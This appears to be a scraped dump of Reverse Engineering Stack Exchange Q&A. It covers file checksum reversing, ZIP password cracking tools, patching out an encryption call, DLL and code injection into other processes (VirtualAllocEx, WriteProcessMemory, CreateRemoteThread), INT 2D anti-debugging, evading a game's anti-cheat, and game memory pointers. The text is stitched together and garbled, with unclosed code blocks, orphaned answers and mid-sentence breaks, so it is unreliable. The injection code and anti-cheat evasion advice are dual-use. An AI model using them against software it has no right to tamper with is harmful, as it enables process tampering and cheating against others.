<p>At least two of the actions taken seems to be <a href=""https://bitbucket.org/hbhzwj/imalse/src/74e53be30a75/tools/inet-3.0/libj_random.c#cl-350"" rel=""nofollow noreferrer"">libj_randl1()</a> and <a href=""https://bitbucket.org/hbhzwj/imalse/src/74e53be30a75/tools/inet-3.0/libj_random.c#cl-364"" rel=""nofollow noreferrer"">libj_randl2()</a>. <em>(This would be step 2.2 in list above.)</em></p>

<p>Simplified:</p>

<pre><code>edx = memory address of buffer
ecx = offset / 0x4000
edi = edx
ebx = ecx * 0x9b9
esi = last dword of buffer &amp; 0x7fffffff
ecx = 0

i = 0;
while (i &lt; 0x3ffc) { /* size of buffer - 4 */
    manipulate buffer
}

    buf_size -= 4;

<p>Then a checksum is generated of the resulting buffer, (minus last dword), and checked against last dword. Here it uses a buffer from BSS segment that is generated upon startup, <em>step 1. from list above</em>. (Offset <code>0x00505000</code> + <code>0x894</code> and using a region of <code>4 * 0x100</code> as it is 256 32 bit integers). This seed map seems to be constant (never re-generated / changed) and can be skipped if one do not want to validate the buffer.</p>

</code></pre>

<p>The code for the BSS numbers can simplified be written in C as e.g.:</p>



<pre><code>int eax;    /* INT NR 1, next generated number to save */
int i, j;

unsigned int bss[0x100] = {0};  /* offset 00505894 */

        if (eax &amp; 0x80000000) {
            eax = (eax + eax) ^ 0x4c11db7;

<p>That bss int array is used on the manipulated buffer to generate a checksum that should be equal to the last integer in the 16384 bytes read from file. <em>(Last dword, the one skipped in checksum routine and XOR'ing.)</em>. <em>This would be step 2.3 in list above.</em></p>



<pre><code>unsigned char *buf = manipulated file buffer;

<p>Shortened to a C routine it could be something like:</p>



<pre><code>int32_t checksum(int32_t map[0x100], uint8_t *buf, long len)
{
    int i;
    int32_t k, cs = 0;

    for (i = 0; i &lt; len; ++i) {
        k = (cs &gt;&gt; 0x18) &amp; 0xff;
        cs = map[buf[i] ^ k] ^ (cs &lt;&lt; 0x08);
    }

    return cs;
}
</code></pre>

<hr>

<p>It is checked to be OK and then checksum in buffer is set as: two least significant bytes = 0, two most significant bytes are set to some number (chunk number in file or read number, (starting from 0)).</p>

<pre><code>0045F9BF   . C680 FC3F0000 &gt;MOV BYTE PTR DS:[EAX+3FFC],0     ;  Set two lower bytes of checksum in dat buf to 0
0045F9C6   . C680 FD3F0000 &gt;MOV BYTE PTR DS:[EAX+3FFD],0     ;  follows previous
0045F9CD   . 66:8B4D F8     MOV CX,WORD PTR SS:[EBP-8]       ;  Set CX to stack pointer value of addr EBP - 8 (counter of sorts)

<p>Now after all this is done the actual copying of data starts with even more algorithms. <strong>Here the real work starts</strong>. Identifying data types, structures, where and what etc. Found some <em>routines</em> that extracted names etc. But everything being Finnish didn't help on making it easier to grasp ;).</p>

<p><em>Some notes:</em></p>

<p>Keep a backup of the .dat file you are working with. If you abort the application the file often gets corrupted as it, as noted by <a href=""https://reverseengineering.stackexchange.com/users/1924/blabb"">@blabb</a>, write data back to file. The .dat file also seem to be <em>live</em> so a new download of it would result in different data.</p>

"Reverse engineering zip file","3203","","<p>Is it possible to reverse engineer ZIP file with password, and get the password or the data that is containing. I'm wondering because there is challenge in hacking lab which is to extract file from ZIP with passwd protection, and it's category is reverse engineering but when I look at the HEX dump I only see the file name.</p>
","<p>From <a href=""http://www.elcomsoft.com/archpr.html"" rel=""nofollow"">http://www.elcomsoft.com/archpr.html</a> -</p>

<blockquote>
  <p>Certain ZIP and ARJ archives can be unlocked and decrypted in just
  minutes, provided that you have at least one unprotected file from
  that archive at your discretion. It does not matter how long and
  complex the password is! If you have a file from the encrypted ZIP
  archive in your hands, the whole archive can be usually unlocked in
  minutes by applying the known-plaintext attack.</p>
  
  <p>After carefully analyzing the algorithms and implementations of
  password protection in different versions of WinZip, ElcomSoft
  developed a work-around solution to allow quick guaranteed decryption
  of certain ZIP archives instead of performing lengthy attacks. If an
  encrypted ZIP archive was created with WinZip version 8 or earlier,
  and if the archive contains 5 or more files, Advanced Archive Password
  Recovery can unlock the archive and decrypt its content – guaranteed!
  A modern PC takes just under one hour to finish the job.</p>
</blockquote>

<p>If those special cases don't apply, you'd need to apply standard brute-force techniques. Either way, you'd want to use <a href=""http://www.elcomsoft.com/archpr.html"" rel=""nofollow"">Advanced Archive Password Recovery</a> or a <a href=""http://www.password-crackers.com/en/category_98/"" rel=""nofollow"">similar tool</a>.</p>

"Is it possible to make an application skip a call?","3171","","<p>I have an application that calls a subroutine before sending the data over socket and in that subroutine the packet is being encrypted. Is there any way to make application skip that subroutine and send the packet as non-encrypted ?</p>
","<p>As Dillinur wrote, you need to NOP out this call. To do that you may need a hex editor, like <a href=""http://www.x-ways.net/winhex/"" rel=""nofollow noreferrer"">WinHex</a>. To NOP out the subroutine, you have to determine from which address it is called. To see that address, in IDA go to <strong>Options -> General</strong> and mark <strong>Line Prefixes</strong>. </p>

<p>It's also nice to see which Opcodes you would like to NOP out. Go to <strong>Options -> General</strong> and write <strong>6</strong> in the field <strong>Number of opcode bytes</strong>. Then your IDA graph mode will look like that:</p>

<p><a href=""https://i.stack.imgur.com/JRKL4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/JRKL4.png"" alt=""IDA Graph mode""></a></p>

<p>In my example, if I want to skip the foo-subroutine while execution, I need to set the opcode bytes <em>E8 DF E6 FF FF</em> to <em>90 90 90 90 90</em> (E8 is the call mnemonic and the rest are the offset bytes). 0x90 is the NOP opcode.</p>

<p>To NOP out these bytes I open the executable in <a href=""http://www.x-ways.net/winhex/"" rel=""nofollow noreferrer"">WinHex</a> and search the offset 0x31CC (not 0x4031CC, because 0x400000 is the load address of my executable in IDA). Finally, when I've found the offset 0x31CC I look for the sequence of bytes E8 DF E6 FF FF and then edit them to 90 90 90 90 90. Save it.</p>

<p>Also you may think about NOPing out of the PUSH-instruction(s) preceding your subroutine in order to avoid errors in the succeeding code.</p>

"Has XOR EAX, EBX another purpose?","3160","","<p>I have the following line in an assembler code:</p>

<pre><code> XOR EAX, EBX

<p>So, then I've searched a little bit and found out that XOR represents a ""swap algorithm"". You can read it here: <a href=""http://en.wikipedia.org/wiki/XOR_swap_algorithm"" rel=""nofollow"">http://en.wikipedia.org/wiki/XOR_swap_algorithm</a></p>

<p>But when I look in register window of ollydbg, then I have the following </p>

<pre><code> EAX = 00000068
 EBX = 0000003B
</code></pre>

<p>Now, after the line the register window says</p>

<pre><code>EAX = 000000053
EBX = 0000003B

<p>But from that what I have read in wikipedia article I would expect the following</p>

<pre><code>EAX = 0000003B
EBX = 00000053

<p>At the end, i can say that a normal XOR operation is performed because:</p>

<pre><code>0111011   =&gt;EAX=0000003B 
1101000   =&gt;EBX=00000068
-------
1010011   =&gt;EAX=00000053

<p>So my question would be why the swap algorithm is not performed. Or in other words: When can I expect the swap algorithm?</p>
","<p>As the first answer states, XOR is a bitewise XOR, not an XOR swap. </p>

<p>To do the Xor swap that you referenced from wikipedia it takes <em>3 instructions</em> : </p>

<pre><code>xor eax, ebx
xor ebx, eax
xor eax, ebx
</code></pre>

<p>Since you asked about the <em>purpose</em> of XOR I thought I would include some other concepts for you to read up on, so you might have an idea of what to expect from XORs</p>

<p>You can use XOR to clear a register: </p>

<pre><code>xor eax,eax
</code></pre>

<p>Calculate absolute value: </p>

<pre><code>cdq
xor eax,edx
sub eax,edx

<p>XORs can be used for Crypto:
<a href=""http://en.wikipedia.org/wiki/XOR_swap_algorithm"">http://en.wikipedia.org/wiki/XOR_swap_algorithm</a></p>

<p>XORs are used in the CRC checksum algorithm:

","<p>The SquashFS image is version 3.0 with LZMA compression; LZMA compression was not officially added to SquashFS until version 4.0, so standard SquashFS tools won't recognize it.</p>

<p>You need to give <code>sasquatch</code> the SquashFS image, not the raw firmware image. First, extract it with <code>dd</code> and then run <code>sasquash</code> against the extracted file:</p>

"Dll injection and GetProcAddress with the winapi","3072","","<p>So i just read a little bit about how one would go about for injecting a dll into a running program <a href=""https://en.wikipedia.org/wiki/DLL_injection"">on Wikipedia</a> (the <code>CreateRemoteThread</code> idea). I followed the steps described and eventually got it working. The thing i found interesting though which took some time to figure out are the following: When creating my remote thread and sending in the function i would like to be run as the first/starting one i hit a snag, when it was run it failed to call the proper functions, they seemed to turn into rubbish when i looked at them in OllyDBG which in turn resulted in the program crashing down on me. The code i used then was something along these lines:</p>

<pre><code>static DWORD __stdcall inject(LPVOID threadParam)
{
    MessageBoxA(NULL, ""test"", ""test"", NULL);
    LoadLibrary(""my.dll"");
    return 0;
}
</code></pre>

<p>And somewhere else:</p>

<pre><code>CreateRemoteThreadEx(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(fnPageBase), dbPageBase, 0, NULL, &amp;threadId);
</code></pre>

<p>Where <code>fnPageBase</code> is the memory I've allocated in the to be injected process for my function and dbPageBase the memory I've allocated for a struct that is passed as the <code>LPVOID threadParam</code>.</p>

<p>Something like that, the problem was that both <code>MessageBoxA</code> and <code>LoadLibrary</code> didn't get a proper address it would seem, when i checked them in OllyDBG they always pointed to something that didn't exist. I googled around a little and found out that i should be using <code>GetProcAddr</code> to get a address to ie: <code>LoadLibrary</code> which i could later use by sending in some data via the <code>LPVOID threadParam</code> in my <code>inject()</code> call. So my question is: Why does it work when i use the <code>GetProcAddr</code> and not when I just try to use it ""normally""? Do I get some specific address that's always mapped in for everyone in the same region in memory when using that? </p>

<p>Also, what happens to my strings in the <code>inject()</code> function? Are they moved to some other place during compile which makes them unavailable to the program i'm injecting since it's in a totally different place of the memory (i.e., it's not mapped to there?)? I worked that around by sending that along in a struct with the <code>LPVOID threadParam</code> aswell in a struct that i had copied over to memory available to the <code>.exe</code> I was injecting. </p>

<p>If you need more info on how I did the other parts please do tell and I'll update.</p>
","<p>One thing you need to keep in mind is that code in your process and the code in the target process reside in <strong>different address spaces</strong>. So any address in your program is not necessary valid in the target process and vice versa.</p>

<p>This means the code that you inject cannot many any assumptions about addresses of functions or variables. Even your <code>inject</code> function's address is valid only in <em>your</em> process; to make it available in the target process you'd have to: 1) copy the code there; and 2) make sure any functions or memory addresses it refers to are valid in the new address space.</p>

<p>That's why the normal approach used with <code>CreateRemoteThreadEx</code> is to copy the DLL name to the target process and create the thread using the address of the <code>LoadLibrary</code> function:</p>

<pre><code>// 1. Allocate memory in the remote process for szLibPath
pLibRemote = ::VirtualAllocEx( hProcess, NULL, sizeof(szLibPath),
                               MEM_COMMIT, PAGE_READWRITE );

// 2. Write szLibPath to the allocated memory
::WriteProcessMemory( hProcess, pLibRemote, (void*)szLibPath,
                      sizeof(szLibPath), NULL );    

// Load ""LibSpy.dll"" into the remote process
// (via CreateRemoteThread &amp; LoadLibrary)
hThread = ::CreateRemoteThread( hProcess, NULL, 0,
            (LPTHREAD_START_ROUTINE) ::GetProcAddress( hKernel32,
                                       ""LoadLibraryA"" ),
             pLibRemote, 0, NULL );
</code></pre>

<p>(snippet <a href=""http://www.codeproject.com/Articles/4610/Three-Ways-to-Inject-Your-Code-into-Another-Proces"">from Code Project</a>)</p>

<p>You can see that <code>pLibRemote</code> (with the address of the DLL name in the target process) is passed as the parameter to the thread routine. So the result of this is equivalent to:</p>

<pre><code>LoadLibraryA(pLibRemote);
</code></pre>

<p>executed in the target process.</p>

<p>Strictly speaking, this is not guaranteed to work because the address of <code>LoadLibraryA</code> in your process is not necessarily the same as <code>LoadLibraryA</code> in the other process. However, in practice it does work because system DLLs like kernel32 (where <code>LoadLibraryA</code> resides) are mapped to the same address in all processes, so <code>LoadLibraryA</code> also has the same address in both processes.</p>

"How can I debug or monitor a Windows Phone 8 application?","3057","","<p>I'm interested in debugging and monitoring a Windows Phone 8 application for which I do not have the source code. Android and iOS can both be rooted/jailbroken, which allows me to use tools like GDB (and others) to debug and monitor a running application, but I'm not aware of anything similar for Windows Phone 8.</p>

<p>Additionaly I want to monitor filesystem activity while running the application (I use <a href=""http://www.newosxbook.com/src.jl?tree=listings&amp;file=3-filemon.c"">Filemon for iOS</a> for this task on iOS). Or is it easier to simply run the application in the Windows Phone 8 simulator and attempt to monitor the app that way?</p>

<p>How do you debug a Windows Phone 8 application without source code?</p>
","<h2>With source</h2>

<p>You could use something like <a href=""http://research.sensepost.com/tools/mobile/xapspy"">XAPSpy</a> and <a href=""https://github.com/andreycha/tangerine"">Tangerine</a> on Github which is updated to work with WP8. It may work without source not sure.</p>

<p>XAPSpy Source: <a href=""https://github.com/sensepost/XAPSpy"">Github</a>. </p>

<h2>Without source</h2>

<p>Something more advanced is need something more like <a href=""http://www.securityninja.co.uk/application-security/windows-phone-app-analyser-v1-0-released-today-2/"">Windows Phone App Analyser</a> </p>

<p>Download/Source: <a href=""http://sourceforge.net/projects/wpaa/"">SourceForge</a></p>

<p>I would imagine you could use them both together by decompliling the .xap you are working with with WPPA and then using XAPSpy on that source. I've never tried that though.</p>

<p>Sadly if you are dealing with a newer app you won't be able 
to decompile it as <a href=""http://forum.xda-developers.com/showthread.php?t=2140706"">they are encrypted</a>. You might be able to somehow get the keys out of the operating system but that would be difficult as well.</p>

"How to find main() in binary?","3040","","<p>Given a binary and only using a tool like <code>ndisasm</code>, how can I find <code>main()</code>?
I don't want to use smart tools like IDA Pro because I'm doing this exercise to learn.</p>
","<p>This is quite tricky and necessitates a LOT of patience. I'll assume here that you're trying to find the <code>main</code> function as it is defined in C and not as the entry point of your program. It's very hard to find what you're looking for by scanning the code with your eyes &amp; brain. But here's a way. What you can do is first check the header of the binary file you're trying to disassemble. Below you'll find the output of <code>readelf -h</code> on a random file. If the file isn't damaged (on purpose or not) you'll be able to find the <em>Entry point address</em>.  </p>

<pre><code>  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)

  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400440

  Size of program headers:           56 (bytes)
  Number of program headers:         8
  Size of section headers:           64 (bytes)
  Number of section headers:         35
  Section header string table index: 32
</code></pre>

<p>This address usually points to the location of the first chunk of code which will be executed at run time (<code>_start</code> function) and which will handle the <code>main</code> function parameters (or command line arguments) before calling the <code>main</code> function. Another technique would be to run your program under a debugger (<strong>GDB</strong> for instance) and go step by step.</p>

<p>I have to warn you though, if you're dealing with ELF binaries, things could turn out to be more complicated as they contain <code>ctor</code> and <code>dtor</code> tables which hold pointers to functions that are executed before and after the <code>main</code> function. You have also some undocumented weirdness going on when dealing with statically linked binaries. And of course, other programs can make do without a <code>main</code> function and call whatever they wish.</p>

","<p>IDA Pro offers two tracing options:</p>

<ol>

<li><strong>Function tracing</strong> <kbd>Debugger->Tracing->Function Tracing</kbd>. It is a subcategory of instruction tracing, where only function calls are logged. </li>
</ol>

<p>There are also three types of tracing events: execution traces, write traces, and read/write traces. </p>

<p>A trace in IDA Pro could by replayed by using <em>Trace replayer</em>. It is located within <em>Debuggers</em> submenu. You could switch to <em>Trace-replayer</em> by going to <kbd>Debugger->Switch Debugger...->Trace replayer</kbd></p>

<p><img src=""https://i.stack.imgur.com/0Hbix.png"" alt=""enter image description here""></p>

<p>One thing to remember that you have to have trace created before you can replay it. In order to create a trace you will need to do the following:</p>

<ol>
<li>Set a breakpoint at the point where you want you trace started. </li>
<li>Run the program with the debugger of your choice. </li>
<li>Whenever it breaks, select desired tracing <em>style</em> (Instruction or Function)</li>
<li>Run as far as necessary. You could set a second breakpoint to stop the trace.</li>
<li>You can optionally save the trace.</li>

"INT 2D Anti-Forensic Method","2977","","<p>Inclusion of an <code>INT 2D</code> instruction appears to be a fairly common anti-debugging tactic used by Windows malware authors. From what I understand, it causes a process to act differently when a debugger is attached from when it is not attached.</p>

<p>I have read that this is due in part to an asynchronous (not part of normal program flow) increment to the instruction pointer. This increment can be made to lead to instruction scission.</p>

<p>Could someone explain this anti-debugging tactic, specifically <em>why</em> this increment to the instruction pointer occurs, and what happens when a debugger <em>is</em> and <em>is not</em> attached.</p>
","<p>From my ""Ultimate"" Anti-Debugging reference (see pferrie.host22.com):</p>

<p>The interrupt 0x2D is a special case.  When it is executed, Windows uses the current EIP register value as the exception address, and then it increments by one the EIP register value.  However, Windows also examines the value in the EAX register to determine how to adjust the exception address.  If the EAX register has the value of 1, 3, or 4 on all versions of Windows, or the value 5 on Windows Vista and later, then Windows will increase by one the exception address.  Finally, it issues an EXCEPTION_BREAKPOINT (0x80000003) exception if a debugger is present.  The interrupt 0x2D behaviour can cause trouble for debuggers.  The problem is that some debuggers might use the EIP register value as the address from which to resume, while other debuggers might use the exception address as the address from which to resume.  This can result in a single-byte instruction being skipped, or the execution of a completely different instruction because the first byte is missing.  These behaviours can be used to infer the presence of the debugger.  The check can be made using this code (identical for 32-bit and 64-bit) to examine either the 32-bit or 64-bit Windows environment:</p>

<pre><code>xor  eax, eax ;set Z flag
int  2dh
inc  eax ;debugger might skip
je   being_debugged
</code></pre>

<p>[end]</p>

<p>So you can see that there's nothing asynchronous happening here.  The change occurs immediately when the exception occurs.
As far as <em>why</em> it occurs, the skipped byte is intended to be used to pass one byte of additional information at the time of the exception.</p>

","<p>In <code>gdb</code> you can set a syscall breakpoint with <code>catch syscall</code>.</p>

<p>If this is in 32-bit x86 (IA-32), check the syscall number in <code>your_linux_source_dir/usr/include/asm/unistd_32.h</code>. There is no syscall called <code>socket</code> in 32-bit x86, do you mean <code>socketcall</code>? Its number is 102.</p>

<p>If this is in x86-64 (AMD64), check the syscall number in <code>your_linux_kernel_source_dir/usr/include/asm/unistd_64.h</code>. The syscall called <code>socket</code> is 41.</p>

<p>Then run the executable in <code>gdb</code>:</p>

<pre><code>$ gdb myexecutable
</code></pre>

<p>And set the syscall breakpoint (41 is the <code>socket</code> syscall number in x86-64, change to appropriate syscall number for you):</p>

<pre><code>(gdb) catch syscall 41

<p>And then run the program:</p>

"What is the reason for this method to call itself?","2901","","<p>While reversing a 32bit Mach-O binary with Hopper, I noticed this peculiar method. The instruction on 0x0000e506 seems to be calling an address right below the instruction. </p>

<p>What would be the reason for this? Is it some kind of register cleaning trickery? </p>

<p><img src=""https://i.imgur.com/e6Pji20.png"" /></p>
","<p>This is for position independent code. The <code>call 0xe50b</code> instruction pushes the address of the next instruction, and then jumps. It jumps to the immediately following instruction, which has no effect. The next instruction, <code>pop eax</code>, loads its own address into <code>eax</code> (as it was the value pushed by <code>call</code>).</p>

<p>Further down it uses an offset from eax:</p>

<pre><code>mov eax, dword [ds:eax-0xe50b+objc_msg_close]
</code></pre>

<p>The value being subtracted, <code>0xe50b</code>, is the address that we moved into <code>eax</code>. If the code hasn't been moved anywhere, <code>eax-0xe50b</code> will be zero, but if the code has been moved to a different location, it will be the offset. We then add the address <code>objc_msg_close</code>, so we'll be able to reference it, even if the code has been moved in memory.</p>

<p>Hopper is actually being quite clever about it, because the instruction just says (from ndisasm):</p>

<pre><code>mov eax,[eax+0x45fe75]
</code></pre>

<p>but Hopper knows that <code>eax</code> contains the value of the instruction pointer at <code>0xe50b</code>, so uses that offset to find the symbol for you.</p>

"How to prevent application from killing OllyDbg","2872","","<p>I want to run an OllyDbg and attach it to some starting later process.</p>

<p>But the problem is, that process is very aggressive: it kills OllyDbg on start, and I also can't run OllyDbg later because that process then crashes with some invective message written in some moonspeak language (there are symbols that can be read, and they tell something about 'antihack.dll', for which, though, I don't found any reference to using Dependency walker and Pe Explorer).</p>

<p>So, is there any way how to prevent this aggressive process from killing any working app and connect it somehow to OllyDbg?</p>

Even if rum without debugger in background process fails after some time with an memory access error (and I even replaced an .exe with the original one in case of some arbitrary overwrites).</p>

If there is a driver, load its binary into IDA and start reversing, and if you're on 32-bit grab an anti-rootkit program (GMER, kernel detective, XueTr) and remove their hooks.</p>

<blockquote>
  <p>""they tell something about 'antihack.dll', for which, though, I don't
  found any reference to using Dependency walker and Pe Explorer""</p>
</blockquote>

<p>Maybe the antihack.dll is loaded into a seperate process? Try monitoring process creation or just use taskmanager and see if there's a seperate process that is killing your Olly. Alternatively, it could just be a delayed LoadLibrary call. Also, the program might be injecting antihack.dll into your process instead of loading it (unlikely in this case).</p>

<p>If you're on a 32-bit OS, PhantOm with driver enabled should be enough to protect your Olly. If it isn't, try looking for other plugins that hide Olly. On a 64-bit OS, you would need to write your own driver, though with PatchGuard around even that will probably not be enough since they could be detecting your Olly by its window names/positions/hierarchy.</p>

<p>If you want to attach to a program with an antihack feature you would preferably partially or completely disable the antihack first. Stealthing an invasive debugger to get it to attach to an already running protected process is not a nice approach. Start with static analysis in IDA, find a way to start the program in Olly and debug the startup process, or start with less invasive dynamic analysis (Cheat Engine).</p>

"Is there a way to adjust local variables when a function doesn't utilize ebp?","2868","","<p>I have a problem just like in the question. Modern compilers don't use <code>ebp</code> to handle local variables and arguments, they just calculate and add hard=coded offsets to <code>esp</code>. Example: </p>

...     
mov     [esp+5Eh+var_1], 123h

call    some_func            ; var_1 and var_2 point to actual addresses
cmp     eax, 0               ; esp changed (stdcall), var_1 and var_2 point to wrong addresses

;  creation of a ""fake"" variable example:
;  var_3 = -8h
;  var_4 = -12h 
mov     [esp+5Eh+var_3], 78h  ; var_3 at: esp + 5Eh -8h

mov     [esp+62h+var_3], 89h

<p>This results in a lot of overhead: IDA creates ""fake"" local variables (i.e. several names for one and the same address), you can't freely check variables whenever you want to, you have to create additional comments, etc. So I was wondering is there any way to fix that ?</p>

<p>PS. I'm using IDA Pro Free. Tell me if it is possible only in IDA Pro (full version). </p>
","<p>The variable names that IDA is generating aren't ""fake""; they are exactly the same as they would be labeled had the function been <code>ebp</code>-based. The problem you describe is only really an issue when debugging since that's the only time you can inspect the values pointed to. I'm not aware of any built-in way to get IDA to display what you want. When you hover over an operand, IDA just takes the current value of the register and adds the offset. If <code>esp</code> has changed, then it will show you the wrong address, which is what you're seeing in your example.</p>

<p>Since IDA does know the correct stack offset, one way to do what you're asking is to write an IDC script that checks <code>eip</code> and adjusts for the difference in <code>esp</code> values before calculating the final target address. The IDC function that gets the stack offset at a given address is <a href=""https://www.hex-rays.com/products/ida/support/idadoc/351.shtml"" rel=""nofollow""><code>GetSpd()</code></a>. The algorithm would go something like this:</p>

<ol>
<li>Calculate the target address of the operand you are interested in (i.e. esp+5Eh+var_1 -> 0x10000000)</li>
<li>Get the stack pointer delta (SPD) of the line containing the operand you're interested in (i.e. 5Eh)</li>
<li>Get the SPD of <code>eip</code> (i.e. 6Eh)</li>
<li>Calculate the difference of the two SPDs and add (or subtract) that amount from the target address you calculated in step 1 (i.e. 0x10000000 + (6Eh-5Eh) = 0x10000010)</li>
<li>Go to your calculated address ([0x10000010] contains the variable you are after)</li>

"""Raw"" offsets to ""disassembler"" offsets?","2830","","<p>This is a very silly question, but surprisingly I've had a problem with this today.
In a hex editor, I've found an offset and I wanted to take a look at that code in a disassembler. In the hex-editor, the offset is EBE75, and it looks like this:</p>

<p><img src=""https://i.stack.imgur.com/QmuKd.png"" alt=""enter image description here""></p>

<p>Obviously a CALL, I wanted to find it in IDA/Olly and take a look. This is, however, where I wasn't sure how to translate that to an offset that IDA/Olly could understand. Do I add the imagebase, or maybe the offset of the .text section? I've managed to find the code using IDA's hexscan, and it's located at address <code>004ECA75</code>:</p>

<p><img src=""https://i.stack.imgur.com/flPcg.png"" alt=""enter image description here""></p>

<p>The difference between these addresses is <code>4ECA75 - EBE75 = 400C00</code>. This is quite surprising to me, where did that number come from? How is this related to the .exe's layout?</p>
","<p>To convert a raw offset in a PE file to its corresponding ""disassembler offset"" (known as the virtual address or VA), you need to perform the following steps:</p>

<p><strong>Step 1</strong></p>

<p>Using a PE editor, look at the PE file's section table to find the section containing the file offset.</p>

<p>For example, let's say your PE file's section table looks like this:</p>

<pre><code>+-----------------------------------------------------------------+
|  Name  | Virtual Address | Virtual Size | Raw Offset | Raw Size |
|--------+-----------------+--------------+------------+----------|
| .text  |    00001000     |   00152CA1   |  00000400  | 00152E00 |
| .data  |    00154000     |   000040C0   |  00153200  | 00004200 |
| .rsrc  |    00159000     |   00062798   |  00157400  | 00062800 |
| .reloc |    001BC000     |   00003B3C   |  001B9C00  | 00003C00 |
+-----------------------------------------------------------------+
</code></pre>

<p>You can see above that the section containing raw offset <code>EBE75</code> is the <code>.text</code> section, since <code>00000400 &lt;= EBE75 &lt; 00153200</code>.</p>

<p><strong>Step 2</strong></p>

<p>Using a PE editor, look up the PE file's image base. For example, let's say your file's image base is <code>00400000</code>.</p>

<p><strong>Step 3</strong></p>

<p>Perform the following calculation:</p>

<pre><code>(target raw offset) - (raw offset of section) + (virtual address of section) + (image base)
= (target virtual address)
</code></pre>

<p>Filling in the example values above, we find that the virtual address for raw offset <code>EBE75</code> is:</p>

<pre><code>EBE75 - 00000400 + 00001000 + 00400000
= 4ECA75

"Does code injected into process memory always belong to a page with RWX access?","2804","","<p>I've seen a few memory forensics tutorials, which start by looking for injected code in the ""victim's"" process memory. They always seem to find the injected code in pages which have RWX access (i.e. PAGE_EXECUTE_READWRITE). </p>

<p>Does this assumption always hold? Does code injected (e.g. by malware) into the process memory of a ""victim"", always belong to a page with RWX access? Or can the page access be changed, by the code that is injected? If so, how can this change be done via winapi?</p>
","<p>The assumption does not hold true, as it is possible to alter page protection flags <em>after</em> you've allocated memory.</p>

<p>The usual mechanism for code injection on Windows is as follows:</p>

<ol>
<li>Call <code>OpenProcess</code> for the target process, to get a handle that has appropriate access privileges.</li>
<li>Use <code>VirtualAllocEx</code> to allocate a buffer in the target process, with a set of memory page access flags.</li>
<li>Use <code>WriteProcessMemory</code> to copy the memory to the target.</li>
<li>Either patch existing code to jump to the new code block, or use <code>CreateRemoteThread</code> to execute within the process via a new thread.</li>
</ol>

<p>Now, there are two options here. The first is that you can specify <code>PAGE_EXECUTE_READWRITE</code> as a flag to <code>VirtualAllocEx</code>, so that you have the right to use <code>WriteProcessMemory</code> on that page, and also the right to execute that memory when you get to step 4. This is the ""lazy"" way that leads to having RWX buffers hanging around. The alternative way is to pass <code>PAGE_READWRITE</code> when allocating the block, then write the code, and call <code>VirtualProtectEx</code> to swap the flag over to <code>PAGE_EXECUTE_READ</code> before step 4. This gives you an RW buffer when copying data, then an RX buffer when executing.</p>

<p>Pseudocode:</p>

<pre><code>rights = PROCESS_VM_OPERATION |
         PROCESS_VM_READ | PROCESS_VM_WRITE | 
         PROCESS_QUERY_INFORMATION | 
         PROCESS_CREATE_THREAD;

handle = OpenProcess(rights, false, pid);

targetAddr = VirtualAllocEx(handle, NULL, 4096, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

buffer = ""Hello, world!\0"";
bytesWritten = 0;
WriteProcessMemory(handle, targetAddr, buffer, 14, &amp;bytesWritten);

oldProtect = 0;
VirtualProtectEx(handle, targetAddr, 4096, PAGE_EXECUTE_READ, &amp;oldProtect);

<p>And I thought <code>*(_DWORD *)</code> should return a value. But instead, it returns another pointer. How is that happened (The both values of the memory, <code>0xc</code> away from <code>&amp;val_253</code> and <code>0x8</code> away from <code>&amp;val_253</code> are zero).</p>

"Is it possible to find static pointer with disassembler?","2790","","<p>I found an assembler instruction: <code>mov [esi+2F],dl</code>. I think ESI is a reference to a struct or class. <code>0x2F</code> is the offset that references a property of the struct/class. Is it possible to find the value of the ESI register? I think this class or struct is initialized when the game is started.</p>

<p>For example, I tried to reverse GTA San Andreas. A lot of memory addresses of the GTA SA <a href=""http://www.gtamodding.com/?title=Memory_Addresses_%28SA%29"" rel=""nofollow"">here</a>.</p>

<p>I've found such information in this site: 0xB6F5F0 - Player pointer (CPed).</p>

<p>I think it's address that I finding now. But how I can find it with debugger like cheat-engine without pointer scan? I'd like to find addresses in asm code. It's possible?</p>

<p>I tried to set a breakpoint to the instruction. But I think it's useless because ESI address is dynamic. As I understand CPed struct/class uses dynamic memory allocation.</p>

<p>I am sorry for my bad English and thanks in advance.</p>
","<h1>Yes, it is possible</h1>

<p>I'm going to explain you a bit how most games do it (I have never reversed any GTA but I suppose it's something like this anyway).</p>

<p>I'm going to cover static and dynamic allocation of structures.</p>

<hr>

<p><strong>The static way:</strong></p>

<pre><code>GlobalGameInfo g_info;
// ...
g_info.some_data = 1;
</code></pre>

<p>This is what ends up being a static offset in IDA, like so:</p>

<pre><code>lea eax, [g_info + 0xAABB] ; suppose 0xAABB is the offset for 'some_data'
mov [eax], 1;
</code></pre>

<p><code>g_info</code> is always going to stay at the same offset, so once you find it, you can just use <code>g_info + offset</code> to get your data.</p>

<p><strong>The dynamic way:</strong></p>

<pre><code>Player* players; // can be defined as Player* players[&lt;count&gt;] or Player** players;
                 // it's the same
// ...
players = new Player[players_count];
// ...
players[1].alive = false;
</code></pre>

<p>Which then results in:</p>

<pre><code>; this is a static location which is actually the ""players"" variable
; and it contains an address which points to the offset in memory of the
; actual players structure
dword_xxxx dd ?
</code></pre>

<p>So to use it in e.g. Cheat Engine, you <code>Add a new address</code>, check <code>Pointer</code>, add the <code>xxxx</code> part of <code>dword_xxxx</code>, and in offset, put your desired offset.
For example, to get <code>players[1].alive</code>, with <code>alive</code> being on offset e.g. 0x100, you'd calculate:</p>

<pre><code>value_stored_in_dword_xxxx + sizeof(Player) * player_id + 0x100
</code></pre>

<p>So if <code>dword_xxxx</code> -> <code>0xAABBCCDD</code>, <code>sizeof(Player)</code> -> <code>0x204</code>, <code>player_id</code> -> <code>8</code>, and <code>offset</code> -> <code>0x100</code>, your calculation would be:</p>

<pre><code>0xAABBCCDD + (0x204 * 8) + 0x100
// ^base      ^size   ^id  ^offset
</code></pre>

<hr>

<h2>The example</h2>

<p>Since you gave us <code>mov [esi + 0x2F], dl</code>:</p>

<ul>
<li><code>esi</code> is a pointer to the structure. Look above (in the disassembly).

<ul>
<li><code>mov esi, dword ptr [dword_xxxx]</code> (most probably) means it's dereferencing a pointer, which means that the structure is allocated dynamically.</li>
